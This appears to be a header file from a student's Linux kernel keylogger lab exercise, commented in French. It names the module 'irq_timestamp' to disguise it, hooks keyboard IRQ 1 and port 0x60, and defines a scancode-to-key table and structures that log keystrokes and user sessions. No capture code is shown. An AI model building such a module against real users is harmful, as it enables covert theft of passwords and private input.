// Données du module

#define DRIVER_AUTHOR	"bonnocle"
#define DRIVER_DESC	"Mon keylogger tp3 psa"
#define MODULE_NAME	"irq_timestamp"

// Informations pour le périphérique de type caractère

#define CHAR_DEV_RANGE_DEVICES_NAME MODULE_NAME
#define CHAR_DEV_CLASS_NAME MODULE_NAME
#define CHAR_DEV_DEVICE_NAME MODULE_NAME
#define IRQ_WATCHING	1       // Quel signal irq à surveiller (1 = keystroke)

// Données sur la sauvegarde des messages

#define COUNT_MAX_MSG	50      // Nombre de signal de touche à sauvegarder
#define SIZE_MAX_MSG	255     // Taille maximum des messages par ligne

// Informations sur la durée

#define S_FROM_M	60      // secondes par minute
#define M_FROM_H	60      // minutes par heure
#define H_FROM_D	24      // heures par jour

// Structure des données du keylogger

#define NOKEY		"NOTDEFINED"

#define KBD_DATA_REG        0x60        // I/O port for keyboard data
#define KBD_SCANCODE_MASK   0x7f        // scancode de la keystroke
#define KBD_STATUS_MASK     0x80        // status de la keystroke

struct input_user {
	long keystrokes_time[COUNT_MAX_MSG];
	char keystrokes_scancode[COUNT_MAX_MSG][SIZE_MAX_MSG];
	long last_message;
	long last_login;
	int nb_msg;
	int header;
	int keystroke_since_last_login;
	int nb_session;
	struct session_user *head_session;
	struct session_user *tail_session;
};

struct session_user {
	long login;
	long logout;
	struct session_user *next;
};

const unsigned char *codekeystroke[256] = {
        [0]   = NOKEY,
        [1]   = "ESC",
        [2]   = "&",
        [3]   = "é",
        [4]   = "\"",
        [5]   = "'",
        [6]   = "(",
        [7]   = "-",
        [8]   = "è",
        [9]   = "_",
        [10]  = "ç",
        [11]  = "à",
        [12]  = ")",
        [13]  = "=",
        [14]  = "DEL",
        [15]  = "TAB",
        [16]  = "a",
        [17]  = "z",
        [18]  = "e",
        [19]  = "r",
        [20]  = "t",
        [21]  = "y",
        [22]  = "u",
        [23]  = "i",
        [24]  = "o",
        [25]  = "p",
        [26]  = "^",
        [27]  = "$",
        [28]  = NOKEY,
        [29]  = "CTRL",
        [30]  = "q",
        [31]  = "s",
        [32]  = "d",
        [33]  = "f",
        [34]  = "g",
        [35]  = "h",
        [36]  = "j",
        [37]  = "k",
        [38]  = "l",
        [39]  = "m",
        [40]  = NOKEY,
        [41]  = NOKEY,
        [42]  = NOKEY,
        [43]  = "*",
        [44]  = "w",
        [45]  = "x",
        [46]  = "c",
        [47]  = "v",
        [48]  = "b",
        [49]  = "n",
        [50]  = ",",
        [51]  = ";",
        [52]  = ":",
        [53]  = "!",
        [54]  = NOKEY,
        [55]  = "*",
        [56]  = NOKEY,
        [57]  = "SPACE",
        [58]  = NOKEY,
        [59]  = NOKEY,
        [60]  = NOKEY,
        [61]  = NOKEY,
        [62]  = NOKEY,
        [63]  = NOKEY,
        [64]  = NOKEY,
        [65]  = NOKEY,
        [66]  = NOKEY,
        [67]  = NOKEY,
        [68]  = NOKEY,
        [69]  = NOKEY,
        [70]  = NOKEY,
        [71]  = "7",
        [72]  = "8",
        [73]  = "9",
        [74]  = "-",
        [75]  = "4",
        [76]  = "5",
        [77]  = "6",
        [78]  = "+",
        [79]  = "1",
        [80]  = "2",
        [81]  = "3",
        [82]  = "0",
        [83]  = "DEL",
        [84]  = NOKEY,
        [85]  = NOKEY,
        [86]  = NOKEY,
        [87]  = NOKEY,
        [88]  = NOKEY,
        [89]  = NOKEY,
        [90]  = NOKEY,
        [91]  = NOKEY,
        [92]  = NOKEY,
        [93]  = NOKEY,
        [94]  = NOKEY,
        [95]  = NOKEY,
        [96]  = NOKEY,
        [97]  = NOKEY,
        [98]  = NOKEY,
        [99]  = NOKEY,
        [100] = NOKEY,
        [101] = NOKEY,
        [102] = NOKEY,
        [103] = NOKEY,
        [104] = NOKEY,
        [105] = NOKEY,
        [106] = NOKEY,
        [107] = NOKEY,
        [108] = NOKEY,
        [109] = NOKEY,
        [110] = NOKEY,
        [111] = NOKEY,
        [112] = NOKEY,
        [113] = NOKEY,
        [114] = NOKEY,
        [115] = NOKEY,
        [116] = NOKEY,
        [117] = NOKEY,
        [118] = NOKEY,
        [119] = NOKEY,
        [120] = NOKEY,
        [121] = NOKEY,
        [122] = NOKEY,
        [123] = NOKEY,
        [124] = NOKEY,
        [125] = NOKEY,
        [126] = NOKEY,
        [127] = NOKEY,
        [128] = NOKEY,
        [129] = NOKEY,
        [130] = NOKEY,
        [131] = NOKEY,
        [132] = NOKEY,
        [133] = NOKEY,
        [134] = NOKEY,
        [135] = NOKEY,
        [136] = NOKEY,
        [137] = NOKEY,
        [138] = NOKEY,
        [139] = NOKEY,
        [140] = NOKEY,
        [141] = NOKEY,
        [142] = NOKEY,
        [143] = NOKEY,
        [144] = NOKEY,
        [145] = NOKEY,
        [146] = NOKEY,
        [147] = NOKEY,
        [148] = NOKEY,
        [149] = NOKEY,
        [150] = NOKEY,
        [151] = NOKEY,
        [152] = NOKEY,
        [153] = NOKEY,
        [154] = NOKEY,
        [155] = NOKEY,
        [156] = NOKEY,
        [157] = NOKEY,
        [158] = NOKEY,
        [159] = NOKEY,
        [160] = NOKEY,
        [161] = NOKEY,
        [162] = NOKEY,
        [163] = NOKEY,
        [164] = NOKEY,
        [165] = NOKEY,
        [166] = NOKEY,
        [167] = NOKEY,
        [168] = NOKEY,
        [169] = NOKEY,
        [170] = NOKEY,
        [171] = NOKEY,
        [172] = NOKEY,
        [173] = NOKEY,
        [174] = NOKEY,
        [175] = NOKEY,
        [176] = NOKEY,
        [177] = NOKEY,
        [178] = NOKEY,
        [179] = NOKEY,
        [180] = NOKEY,
        [181] = NOKEY,
        [182] = NOKEY,
        [183] = NOKEY,
        [184] = NOKEY,
        [185] = NOKEY,
        [186] = NOKEY,
        [187] = NOKEY,
        [188] = NOKEY,
        [189] = NOKEY,
        [190] = NOKEY,
        [191] = NOKEY,
        [192] = NOKEY,
        [193] = NOKEY,
        [194] = NOKEY,
        [195] = NOKEY,
        [196] = NOKEY,
        [197] = NOKEY,
        [198] = NOKEY,
        [199] = NOKEY,
        [200] = NOKEY,
        [201] = NOKEY,
        [202] = NOKEY,
        [203] = NOKEY,
        [204] = NOKEY,
        [205] = NOKEY,
        [206] = NOKEY,
        [207] = NOKEY,
        [208] = NOKEY,
        [209] = NOKEY,
        [210] = NOKEY,
        [211] = NOKEY,
        [212] = NOKEY,
        [213] = NOKEY,
        [214] = NOKEY,
        [215] = NOKEY,
        [216] = NOKEY,
        [217] = NOKEY,
        [218] = NOKEY,
        [219] = NOKEY,
        [220] = NOKEY,
        [221] = NOKEY,
        [222] = NOKEY,
        [223] = NOKEY,
        [224] = NOKEY,
        [225] = NOKEY,
        [226] = NOKEY,
        [227] = NOKEY,
        [228] = NOKEY,
        [229] = NOKEY,
        [230] = NOKEY,
        [231] = NOKEY,
        [232] = NOKEY,
        [233] = NOKEY,
        [234] = NOKEY,
        [235] = NOKEY,
        [236] = NOKEY,
        [237] = NOKEY,
        [238] = NOKEY,
        [239] = NOKEY,
        [240] = NOKEY,
        [241] = NOKEY,
        [242] = NOKEY,
        [243] = NOKEY,
        [244] = NOKEY,
        [245] = NOKEY,
        [246] = NOKEY,
        [247] = NOKEY,
        [248] = NOKEY,
        [249] = NOKEY,
        [250] = NOKEY,
        [251] = NOKEY,
        [252] = NOKEY,
        [253] = NOKEY,
        [254] = NOKEY
};

// Utils functions

// Fonction pour afficher l'en-tête du périphérique 
// Prend en arguments le buffer utilisateur, ainsi que l'index à partir du quel
// il faut commencer à écrire l'en-tête. Renvoie l'indice à partir du quel se
// termine l'en-tête.
extern int write_user_data(char *buf, int index);
// Fonction pour afficher l'ensemble des sessions utilisateurs
// Prend en arguments le buffer utilisateur, ainsi que l'index à partir du quel
// il faut commencer à écrire l'en-tête. Renvoie l'indice à partir du quel se
// termine l'en-tête.
extern int write_session(char *buf, int size);
// Fonction renvoyant vrai ssi le temps passé en arguments est supérieur au 
// temps du dernier signal irq reçu plus la durée à partir de laquelle la
// personne est considéré comme déconnecté (argument du module 
// time_before_logout)
extern bool new_irq_after_login(const long time_message);
// Retourne la durée passé en argument sous la forme d'une durée.
// Si print_ago est vrai, alors ajoute "ago" à la fin du message.
extern char *get_time_since(long sec_to_check, bool print_ago);